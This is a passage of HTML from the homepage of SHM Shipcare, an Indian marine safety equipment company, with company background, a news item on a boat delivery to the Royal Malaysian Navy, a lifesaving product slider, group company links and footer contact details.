</a>
</i>
<h3>TURNKEY</h3>
</div>
</div>
</div>
</div>
</section>
<section id="3" class="slide3">
<div class="container-fluid">
<div class="custom-container">
<div class="row">
<div class="col-md-6">
<div class="slide-container">
<span class="text-muted">About us</span>
<br>
<br>
<div class="text-muted-phone">
About us
</div>
<div class="home-about-section">
<p>“Enabling freedom at sea” stands for SHM’s commitment of offering our clients peace of mind at sea, offshore and onshore. We believe in reliability, trust and partnership, which are vital for the industry we operate in. Established in 2001 with a vision to save lives through timely delivery of quality marine safety and survival systems, SHM today has a network spanning over 11 port cities along the Indian coast and across coasts of Dubai, Malaysia, Shanghai, Singapore and Colombo.</p>
<p>Headquartered in Mumbai, SHM provides a one-stop solution for both sales and services and ensures quality solutions; timely delivery of their products and services through a comprehensive infrastructure of manufacturing, supplying, servicing &amp; repairing (over 2,00,000 sq. ft of warehousing and workshop facilities). Our dedicated team of qualified and trained personnel ensure the “peace of mind’’ you have when you know that someone you trust is taking care of you. We enable our customers the freedom to operate, trade, travel, explore, innovate and excel. SHM Shipcare takes pride in a customer centric, solution-based approach driven by incorporating the latest technologies and decades of experience.</p>
<p>Led by Mr. Saifuddin H. Hajee and a strong management team of 400 professionals and industry experts, SHM Shipcare is the largest FRP Boat manufacturer, Life-Saving/Fire-Fighting service provider in India and aims to provide on its experience and expertise top quality solutions through its current service offering and future growth plans in India and overseas.</p>
</div>
<a href="about.php" onclick="location.href='about.php'" class="btn btn-readmore text-right readmore-btn">Read More</a>
</div>
</div>

<!-- News Section -->
<div class="col-md-6">
<div class="video-container">
<div class="embed-responsive embed-responsive-16by9 video-container1">
<iframe width="100%" height="335" src="https://www.youtube.com/embed/GYu4o8tmyNI?rel=0" frameborder="0" allowfullscreen></iframe>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="news-blog news-blog-wrap">
<div class="custom-container">
<div class="news-blog-col news-width" id="news-blog-1">
<div class="news-col">
<div class="news-main">
<img data-src="img/Optimize/SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy.png" src="img/news/SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy.png" alt="SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy" class="img-responsive">
<div class="news-title-new">NEWS</div>
<div class="news-content">
<b>SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy</b>
<p class="hidden-xs hidden-sm hidden-md">Having pioneered inflatable boat manufacturing in India, SHM is now ready to spread its wings globally...</p>
</div>
<button type="button" class="news-redmore-btn" data-toggle="modal" data-target="#news2022-1">Read More</button>
</div>
</div>
</div>


            <div class="modal fade" id="news2022-1" role="dialog">

                <div class="modal-dialog news-modal-dialog">


                    <div class="modal-content">

                        <div class="modal-body text-center">
                            <button type="button" class="close" data-dismiss="modal">&times;</button>

                                <img src="img/news/SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy.png" alt="SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy" class="img-responsive">

                        </div>
                        <div class="modal-txt">
                            <p>
                               Having pioneered inflatable boat manufacturing in India, SHM is now ready to spread its wings globally. Congratulations to the entire Malaysian team!
                            </p>
                            <p>
                                 It gives us immense pride in sharing with you that SHM delivered its first order of Rigid Inflatable Boat overseas to the Royal Malaysian Navy, at Labuan Shipyard.
                            </p>
                            <p>
                                 This marks an important milestone for SHM group and we are certain that SHM boats will find their way to every prestigious client worldwide.
                            </p>

                        </div>

                        <div class="modal-footer">
                            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                        </div>
                    </div>

                </div>

            </div>


<!--
<div class="modal fade" id="news0" role="dialog">
<div class="modal-dialog news-modal-dialog alignment-modal" >
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close" data-dismiss="modal">&times;</button>
<img data-src="img/Optimize/saifuddin_large.jpg" src="img/Optimize/saifuddin_large.jpg" alt="Mr. Saifuddin Hajee was interviewed by The Oil and Gas Year Magazine." class="img-responsive">
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
-->

<div class="news-blog-col blog-width" id="news-blog-2">
<div class="blog-col">
<div class="blog-main" onclick="location.href='https://www.shmgroup.com/blog/boat-maintenance-basics-for-beginners/'" style="background: url('https://www.shmgroup.com/blog/wp-content/uploads/BOAT-MAINTENANCE-2-825x510.png'); background-size: cover;">
<div class="blog-details">
<div class="blog-title-new">
BLOG
</div>
<div class="blog-date">
<a href="https://www.shmgroup.com/blog/boat-maintenance-basics-for-beginners/" title="Boat Maintenance &#8211; Basics for Beginners">Boat Maintenance &#8211; Basics for Beginners</a>
<br> 20th July, 2022</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="news-blog news-blog-wrap">
<div class="custom-container">
<div class="news-blog-col blog-width" id="news-blog-2">
<div class="embed-responsive embed-responsive-16by9">
<iframe class="embed-responsive-item" src="https://www.youtube.com/embed/-S-ApHTWL2k?rel=0" frameborder="0" allowfullscreen></iframe>
</div>
</div>
<div class="news-blog-col news-width" id="news-blog-1">
<div class="news-col">
<div class="news-main">
<img data-src="img/Optimize/12_1.jpg" src="img/Optimize/12_1.jpg" alt="SHM Shipcare participates in the Asia Pacific Maritime Exhibition (APM) at Singapore" class="img-responsive">
<div class="news-title-new" style="width:300px;margin-top:10px;display:inline-block">NEW PRODUCTS</div>
<div class="news-content">
<b>List of products added to portfolio in 2018</b>
</div>
<button type="button" class="news-redmore-btn" data-toggle="modal" data-target="#news2">View</button>
</div>
</div>
</div>
<div class="modal fade" id="news2" role="dialog">
<div class="modal-dialog news-modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal">&times;</button>
</div>
<div class="modal-body text-center">
<div class="clearfix"></div>
<!--
<ul class="rslides" id="slider6">
<li id="callbacks1_s11" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-1.jpg" src="img/Optimize/showroom-1.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s12" class="callbacks1_on" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-2.jpg" src="img/Optimize/showroom-2.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s13" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-3.jpg" src="img/Optimize/showroom-3.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s14" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-4.jpg" src="img/Optimize/showroom-4.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s15" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-5.jpg" src="img/Optimize/showroom-5.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s16" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-6.jpg" src="img/Optimize/showroom-6.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s17" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-7.jpg" src="img/Optimize/showroom-7.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s18" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-8.jpg" src="img/Optimize/showroom-8.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s19" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-9.jpg" src="img/Optimize/showroom-9.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/showroom-10.jpg" alt="Showroom" class="img-responsive">
</li>
</ul>
-->

<ul class="rslides" id="slider6">
<li id="callbacks1_s11" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-1.jpg" src="img/Optimize/12.jpg" alt="Showroom" class="img-responsive">
<label>Work Vest with Collar</label>
</li>
<li id="callbacks1_s12" class="callbacks1_on" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-2.jpg" src="img/Optimize/13.jpg" alt="Showroom" class="img-responsive">
<label>Work Vest with Zipper <br>Product Code : LS05-01002-01</label>
</li>
<li id="callbacks1_s13" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-3.jpg" src="img/Optimize/14.jpg" alt="Showroom" class="img-responsive">
<label>Fireman’s Axe with Insulated Handle<br>
Product Code : FS02-04001-01</label>
</li>
<li id="callbacks1_s14" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-4.jpg" src="img/Optimize/15.jpg" alt="Showroom" class="img-responsive">
<label>Horse Shoe Lifebouy<br>
Product Code : LS02-01011-01</label>
</li>
<li id="callbacks1_s15" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-5.jpg" src="img/Optimize/16.jpg" alt="Showroom" class="img-responsive">
<label>Horse Shoe Lifebouy<br>
Product Code : LS02-01011-01</label>
</li>
<li id="callbacks1_s16" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-6.jpg" src="img/Optimize/17.jpg" alt="Showroom" class="img-responsive">
<label>Quick Release Knife With Cover<br>
Product Code : SC16-10001-01</label>
</li>
<li id="callbacks1_s17" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-7.jpg" src="img/Optimize/18.jpg" alt="Showroom" class="img-responsive">
<label>Inflatable SOLAS Lifejackets 150N<br>
Product Code : LS01-02001-67</label>
</li>
<li id="callbacks1_s18" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-8.jpg" src="img/Optimize/19.jpg" alt="Showroom" class="img-responsive">
<label>Inflatable SOLAS Lifejackets 275N<br>
Product Code : LS01-02002-67</label>
</li>
<li id="callbacks1_s19" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-9.jpg" src="img/Optimize/20.jpg" alt="Showroom" class="img-responsive">
<label>Basket Stretcher<br>
Product Code : EM02-02001-02</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/21.jpg" alt="Showroom" class="img-responsive">
<label>Foot Pump<br>
Product Code : SC16-28001-01</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/22.jpg" alt="Showroom" class="img-responsive">
<label>Lifebuoy Floating Life-Line Release Case<br>
Product Code : LS02-03001-01</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/23.jpg" alt="Showroom" class="img-responsive">
<label>Rescue Tube<br>
Product Code : LS02-03005-01</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/24.jpg" alt="Showroom" class="img-responsive">
<label>Rescue Tube<br>
Product Code : LS01-02001-67</label>
</li>
</ul>



<div class="clearfix"></div>
</div>


<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>

</div>
</div>
</div>
</div>
</section>


<div class="clearfix"></div>


<section style="text-align:center;height:100%" id="6" data-jq-clipthru="testclass-1">
<section class="slide6" id="6" data-jq-clipthru="testclass-1">

<div class="phone-grp-companies lazy">
<img data-src="img/group-companies-phone.png" src="img/group-companies-phone.png" alt="Group Company">
</div>
<div class="container">
<div class="row tect-center hide-on-phone">
<div class="col-md-3 col-sm-3" style="margin-top:20%">

<div class="fetaure-details homa-shift lazy">
<img data-src="img/Logos/store.png" src="img/Logos/store.png" alt="THE SHM STORE">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='https://theshmstore.com'">THE SHM STORE</a></h4>
</div>

<div class="fetaure-details shm-shift lazy">
</div>

<div class="fetaure-details sharks-shift lazy">
<img data-src="img/Logos/engineering.png" src="img/Logos/engineering.png" alt="SHM ENGINEERING">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM ENGINEERING</a></h4>
</div>
</div>


<div class="col-md-6 col-sm-6">
<div class="fetaure-details lazy" style="margin-bottom:-20px;height:initial!important">
<img data-src="img/Logos/shipcare.png" src="img/Logos/shipcare.png" alt="SHM SHIPCARE PVT LTD">
<h4 class="main-color"><a href="http://shmgroup.com/" onclick="location.href='http://shmgroup.com/'">SHM SHIPCARE PVT LTD</a></h4>
</div>

<div class="phone-image lazy">
<img data-src="img/Home/SHM-group.png" src="img/Home/SHM-group.png" alt="SHM">
</div>

<div class="fetaure-details lazy" style="margin-top:-10px;margin-left:35px;height:initial!important;margin-bottom:40px">
<img data-src="img/Logos/products.png" src="img/Logos/products.png" alt="SHM PRODUCTS PVT LTD">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM PRODUCTS PVT LTD</a></h4>
</div>
</div>


<div class="col-md-3 col-sm-3" style="margin-top:18%">
<div class="fetaure-details craftway-shift lazy">
<img data-src="img/Logos/yard.png" src="img/Logos/yard.png" alt="SHM SHIPYARD LTD">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM SHIPYARD LTD</a></h4>
</div>

<div class="fetaure-details feature-shift lazy">
</div>

<div class="fetaure-details mercantile-shift lazy">
<img data-src="img/Logos/safety.png" src="img/Logos/safety.png" alt="HM FIRESAFETY PVT LTD">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM FIRESAFETY PVT LTD</a></h4>
</div>

</div>
</div>
</div>


<div class="grp-companies-phone" style="margin-bottom:60px">
<div class="logo-box-container">
<div class="logo-box lazy">
<img data-src="img/Logos/shipcare.png" src="img/Logos/shipcare.png" alt="SHM Shipcare Pvt Ltd" style="width:110px">
<div class="logo-name">
SHM Shipcare Pvt Ltd
</div>
</div>
<div class="logo-box lazy">
<img data-src="img/Logos/engineering.png" src="img/Logos/engineering.png" alt="SHM Engineering">
<div class="logo-name">
SHM Engineering
</div>
</div>
<div class="logo-box lazy">
<img data-src="img/Logos/store.png" src="iimg/Logos/store.png" alt="The SHM Store">
<div class="logo-name">
The SHM Store
</div>
</div>
<div class="logo-box small-logo lazy">
<img data-src="img/Logos/yard.png" src="img/Logos/yard.png" alt="SHM Shipyard Ltd">
<div class="logo-name">
SHM Shipyard ltd
</div>
</div>
<div class="logo-box small-logo lazy">
<img data-src="img/Logos/safety.png" src="img/Logos/safety.png" alt="SHM FIRESAFETY PVT LTD">
<div class="logo-name">
SHM Firesafety Pvt Ltd
</div>
</div>
<div class="logo-box no-logo-pad lazy">
<img data-src="img/Logos/products.png" src="img/Logos/products.png" alt="SHM Products Pvt Ltd">
<div class="logo-name">
SHM Products Pvt Ltd
</div>
</div>
<div class="center-line">
</div>
</div>
</div>
</section>
</section>


    <link rel="alternate" href="http://my.shmgroup.com/" type="en">

    <a id="back-to-top" href="#" class="back-to-top" role="button">
        <img src="img/backtotop.png" alt="back to top">
    </a>

    <footer id="footer">

        <div class="container-fluid footer1">

            <div class="row">

                <div class="container">

                    <div class="col-xs-12 col-sm-4 col-md-3 col-lg-3">

                        <h2 class="text-uppercase footer-links-title">
                            SHM SHipcare
                        </h2>


<div class="footer-address-box">
                            <div class="col-xs-1 col-sm-2 col-md-1 col-lg-1">
                                <i class="fa fa-phone" aria-hidden="true"></i>
                            </div>
                            <div class="col-xs-10 col-sm-10 col-md-11 col-lg-11">

                                <span class="phone">+91 2048-55-3333</span>

                            </div>

                            <div class="clearfix"></div>

                            <div class="col-xs-1 col-sm-2 col-md-1 col-lg-1">
                                <i class="fa fa-phone" aria-hidden="true"></i>
                            </div>
                            <div class="col-xs-10 col-sm-10 col-md-11 col-lg-11">

                                <span class="phone">+91 9930001995</span>

                            </div>

                            <div class="clearfix"></div>

                            <div class="col-xs-1 col-sm-2 col-md-1 col-lg-1">
                                <i class="fa fa-envelope" aria-hidden="true"></i>
                            </div>
                            <div class="col-xs-10 col-sm-10 col-md-11 col-lg-11">

                                <span class="email">support@shmgroup.com</span>

                            </div>


                            <div class="clearfix"></div>

                            <div class="col-xs-1 col-sm-2 col-md-1 col-lg-1">
                                <i class="fa fa-briefcase" aria-hidden="true"></i>
                            </div>
                            <div class="col-xs-10 col-sm-10 col-md-11 col-lg-11">

                                <span class="email">hr@shmgroup.com</span>

                            </div>

                            <div class="clearfix"></div>

                            <div class="col-xs-1 col-sm-2 col-md-1 col-lg-1">
                                <i class="fa fa-home" aria-hidden="true"></i>
                            </div>
                            <div class="col-xs-10 col-sm-10 col-md-11 col-lg-11 text-uppercase">

                                Head office
                                BPT. Plot No. 51B, Magazine Street,
                                1st Lane, <br/>Darukhana, Mazagaon,<br />
                                Mumbai, 400010

                            </div>
                        </div>                        <div class="clearfix"></div>
                        <div class="newsletter-box">
                            <div class="message"></div>
                            <p>Subscribe to our Newsletter</p>
                            <form name="frm" method="post" action="" id="subscribe">
                                <div class="input-group">
                                    <input type="email" class="form-control" placeholder="Enter Email" name="email" id="email">
                                    <span class="input-group-btn">
                                    <button class="btn btn-default" type="submit" name="submit">Submit</button>
                                </span>
                                </div>
                                <!-- /input-group -->
                            </form>
                        </div>

                    </div>

                    <div class="col-xs-12 col-sm-4 col-md-7 col-lg-7">

                        <h2 class="text-uppercase footer-links-title">
                            Sitemap
                        </h2>

<div class="footer-menu">

                            <ul class="">
                                <li><a href="index.php" onclick="location.href = 'index.php';">Home</a></li>
                                <li class="has-sub">
                                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">About
                                    <i class="fa fa-angle-down" aria-hidden="true"></i>
                                    </a>

                                    <ul style="display: none;" class="footer-dropdown-menu">
                                        <li><a href="about.php" onclick="location.href = 'about.php';">About Us</a></li>
                                        <li><a href="group-of-companies.php" onclick="location.href = 'group-of-companies.php';">Our Group of companies</a></li>
                                        <li><a href="timeline.php" onclick="location.href = 'timeline.php';">History</a></li>
                                    </ul>
                                </li>
                                <li><a href="what-we-do.php" onclick="location.href = 'what-we-do.php';">What We Do        </a></li>
                                <li class="has-sub">
                                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Product
                                    <i class="fa fa-angle-down" aria-hidden="true"></i>
                                    </a>

                                    <ul style="display: none;" class="footer-dropdown-menu footer-links">
                                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
                                           <li><a href="lifeboats-davit-systems.php" onclick="location.href='lifeboats-davit-systems.php'">LIFEBOATS &amp; DAVIT SYSTEMS</a></li>

                                           <li><a href="rescue-boat-and-davit-systems.php" onclick="location.href='rescue-boat-and-davit-systems.php'">RESCUE BOAT &amp; DAVIT SYSTEMS</a></li>

                                           <li><a href="boats-yachts.php" onclick="location.href='boats-yachts.php'">BOATS &amp; YACHTS</a></li>

                                           <li><a href="liferafts.php" onclick="location.href='liferafts.php'">LIFERAFTS</a></li>

                                           <li><a href="liferaft-accessories.php" onclick="location.href='liferaft-accessories.php'">LIFERAFTS ACCESSORIES</a></li>

                                           <li><a href="personal-life-saving-appliances.php" onclick="location.href='personal-life-saving-appliances.php'">PERSONAL LIFE-SAVING APPLIANCES</a></li>

                                           <li><a href="firesuits-devices.php" onclick="location.href='firesuits-devices.php'">FIRESUITS &amp; BREATHING DEVICES</a></li>

                                           <li><a href="fire-extinguishers.php" onclick="location.href='fire-extinguishers.php'">FIRE EXTINGUISHERS</a></li>

                                           <li><a href="hoses-gun-metal-fittings.php" onclick="location.href='hoses-gun-metal-fittings.php'">HOSES &amp; GUN METAL FITTINGS</a></li>

                                        </div>
                                    </ul>



                                    <ul style="display: none;" class="footer-dropdown-menu footer-links">

                                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">

                                           <li><a href="fixed-safety-equipment.php" onclick="location.href='fixed-safety-equipment.php'">FIXED SAFTEY EQUIPMENT</a></li>

                                           <li><a href="signalling-communication.php" onclick="location.href='signalling-communication.php'">SIGNALLING &amp; COMMUNICATION</a></li>

                                           <li><a href="imo-symbols-signs.php" onclick="location.href='imo-symbols-signs.php'">IMO SYMBOLS &amp; SIGNS</a></li>

                                           <li><a href="dura-cabinets.php" onclick="location.href='dura-cabinets.php'">DURA CABINETS</a></li>

                                           <li><a href="emergency-medical-equipment.php" onclick="location.href='emergency-medical-equipment.php'">EMERGENCY &amp; MEDICAL EQUIPMENT</a></li>

                                           <li><a href="transfer-and-descent-equipment.php" onclick="location.href='transfer-and-descent-equipment.php'">TRANSFER &amp; DESCENT EQUIPMENT</a></li>

                                           <li><a href="marine-chemicals.php" onclick="location.href='marine-chemicals.php'">CHEMICALS</a></li>

                                           <li><a href="general-ship-supplies.php" onclick="location.href='general-ship-supplies.php'">GENERAL SHIP SUPPLIES</a></li>
                                        </div>

                                    </ul>


                                   <div class="clearfix"></div>
                                </li>

                                <li class="has-sub">
                                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Services
                                    <i class="fa fa-angle-down" aria-hidden="true"></i>
                                    </a>

                                    <ul style="display: none;" class="footer-dropdown-menu footer-links">
                                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
                                            <li><a href="services-lifeboats.php" onclick="location.href='services-lifeboats.php'">LIFEBOATS &amp; RESCUES BOATS</a></li>
                                            <li><a href="services-hookreplacement.php" onclick="location.href='services-hookreplacement.php'">HOOK REPLACEMENT</a></li>
                                            <li><a href="services-liferafts.php" onclick="location.href='services-liferafts.php'">LIFERAFTS</a></li>
                                            <li><a href="services-immersionsuit.php" onclick="location.href='services-immersionsuit.php'">IMMERSION SUIT</a></li>
                                            <li><a href="services-lifejacket.php" onclick="location.href='services-lifejacket.php'">INFATABLE LIFEJACKETS</a></li>
                                            <li><a href="services-firefighting.php" onclick="location.href='services-firefighting.php'">FIRE FIGHTING APPLIANCES</a></li>
                                            <li><a href="services-electronics.php" onclick="location.href='services-electronics.php'">ELECTRONICS</a></li>
                                            <div class="clearfix"></div>
                                        </div>

                                    </ul>

                                    <ul style="display: none;" class="footer-dropdown-menu footer-links">
                                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
                                            <li><a href="services-pyrotechnics.php" onclick="location.href='services-pyrotechnics.php'">PYROTECHNICS DISPOSAL</a></li>
                                            <li><a href="services-boatrepairs.php" onclick="location.href='services-boatrepairs.php'">FRP BOAT REPAIRS</a></li>
                                            <li><a href="services-cargogeartesting.php" onclick="location.href='services-cargogeartesting.php'">CARGO GEAR TESTING</a></li>
                                            <li><a href="services-gangwayladders.php" onclick="location.href='services-gangwayladders.php'">GANGWAY &amp; ACCOMODATION LADDERS</a></li>
                                            <li><a href="services-fleetservice.php" onclick="location.href='services-fleetservice.php'">FLEET SERVICE AGREEMENTS</a></li>
                                            <li><a href="services-trainingworkshops.php" onclick="location.href='services-trainingworkshops.php'">TRAINING SEMINARS AND WORKSHOPS</a></li>
                                            <li><a href="services-generalshiprepairs.php" onclick="location.href='services-generalshiprepairs.php'">GENERAL SHIP REPAIRS</a></li>
                                            <div class="clearfix"></div>
                                        </div>

                                    </ul>
                                    <div class="clearfix"></div>

                                </li>
                                <li><a href="agencies.php" onclick="location.href = 'agencies.php';">OEM &amp; Class</a></li>
                                 <li><a href="customers.php" onclick="location.href = 'customers.php';">Customers</a></li>
                                <li><a href="news.php" onclick="location.href = 'news.php';">News</a></li>
                                <li><a href="http://www.shmgroup.com/blog/" onclick="location.href = 'http://www.shmgroup.com/blog/';">Blog</a></li>
                                <li><a href="contact.php" onclick="location.href = 'contact.php';">Contact</a></li>
                                <li><a href="career.php" onclick="location.href = 'career.php';">Career</a></li>
                                <li><a href="gst.php" onclick="location.href = 'gst.php';">GST Enablement</a></li>
                            </ul>



                        </div>

                    </div>

                    <div class="col-xs-12 col-sm-4 col-md-2 col-lg-2">

                        <h2 class="text-uppercase footer-links-title">
                            E-Catalogue
                        </h2>

                        <ul class="footer-menu">
                            <li>
                                <a href="" onclick="window.open('http://shmgroup.com/catalogue/', '_blank')">SHM Catalogue</a>

</li>


                        </ul>

                        <h2 class="text-uppercase footer-links-title">
                            Follow us
                        </h2>

                         <ul class="footer-social">
                            <li>
                                <a href="https://facebook.com/SHMShipcare" target="_blank">
                                    <i class="fa fa-facebook" aria-hidden="true"></i>
                                    <span>facebook</span>
                                </a>
                            </li>
                            <li>
                                <a href="https://www.linkedin.com/company/shm-shipcare" target="_blank">
                                    <i class="fa fa-linkedin" aria-hidden="true"></i>
                                    <span>Linkedin</span>
                                </a>
                            </li>
                            <li>
                                <a href="https://twitter.com/SHMShipcare" target="_blank">
                                    <i class="fa fa-twitter" aria-hidden="true"></i>
                                    <span>@SHMShipcare</span>
                                </a>
                            </li>

                            <li>
                                <a href="https://www.youtube.com/channel/UCJJlITHzby5MVDMWyS70s5g" target="_blank">
                                    <i class="fa fa-youtube-play" aria-hidden="true"></i>
                                    <span>SHM Shipcare</span>
                                </a>
                            </li>
							                            <li>
                                <a href="https://facebook.com/SHMShipcare" target="_blank">
                                    <i class="fa fa-facebook" aria-hidden="true"></i>
                                    <span>facebook</span>
                                </a>
                            </li>

                        </ul>

                        <h2 class="text-uppercase footer-links-title" style="margin-top: 15px;">
                            Feedback
                        </h2>

                        <ul class="footer-menu">
                            <li><a href="feedback.php" onclick="location.href = 'feedback.php';">Customer Feedback</a></li>
                        </ul>

                    </div>

                    <div class="clearfix"></div>

                </div>

            </div>

        </div>

<div class="footer2">

          <div class="container">

            <div class="row">

              <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">

                <ul class="footer-sp-menu text-uppercase">

                    <li><a href="terms-use-agreement.php" onclick="location.href='terms-use-agreement.php'">Terms of Use</a></li>
                    <li><a href="privacy-policy.php" onclick="location.href='privacy-policy.php'">Privacy Policy</a></li>
                    <li><a href="disclaimer.php" onclick="location.href='disclaimer.php'">Disclaimer</a></li>
                    <li class="text-capitalize">&copy; 2016 SHM Shipcare. <br class="vissible-xs hidden-sm hidden-md hidden-lg"> All rights reserved. ISO 9001:2008 Certified. </li>

                </ul>

              </div>

              <!--<div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-copyright">
                  &copy; 2016 SHM Shipcare. <br class="vissible-xs hidden-sm hidden-md hidden-lg"> All rights reserved. ISO 9001:2008 Certified. <br class="vissible-xs hidden-sm hidden-md hidden-lg">Designed by <a href="http://www.destylio.com/" target="_blank">Destylio</a>
              </div>-->
              <!-- /row of widgets -->
            </div>
          </div>
        </div>
    </footer>

    </main>


    <!--<script type="text/javascript" src="js/preventscroll.js"></script>-->
    <!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script>-->
    <!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->

    <script defer>
        (function(i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r;
            i[r] = i[r] || function() {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
            a = s.createElement(o),
                m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            m.parentNode.insertBefore(a, m)
        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-81469214-1', 'auto');
        ga('send', 'pageview');

    </script>

    <script type="application/ld+json">
        {
            "@context": "http://schema.org",
            "@type": "Organization",
            "name": "SHM Group",
            "url": "http://shmgroup.com",
            "sameAs": ["https://www.facebook.com/SHMShipcare",
                "https://twitter.com/SHMShipcare",
                "https://www.linkedin.com/company/shm-shipcare"
            ]
        }

    </script>

                <script defer type="text/javascript" src="js/lightbox-form.js"></script>
            <script defer type="text/javascript" src="js/jquery-ui-1.10.4.custom.min.js"></script>
            <script defer type="text/javascript" src="js/jquery-ui.min.js"></script>
            <script defer type="text/javascript" src="js/jquery.touchSwipe.min.js"></script>
            <script defer type="text/javascript" src="js/swiper.min.js"></script>
            <script defer type="text/javascript" src="js/vendor/bootstrap.min.js"></script>
            <link type="text/css" rel="stylesheet" href="css/thumbnail-slider.css">
            <script defer type="text/javascript" src="js/thumbnail-slider.js"></script>
            <script defer type="text/javascript" src="js/main.js"></script>
            <script defer type="text/javascript" src="js/product-subpage.js"></script>
            <script defer type="text/javascript" src="js/product-custom.js"></script>

            <script>
                $(document).load(function() {

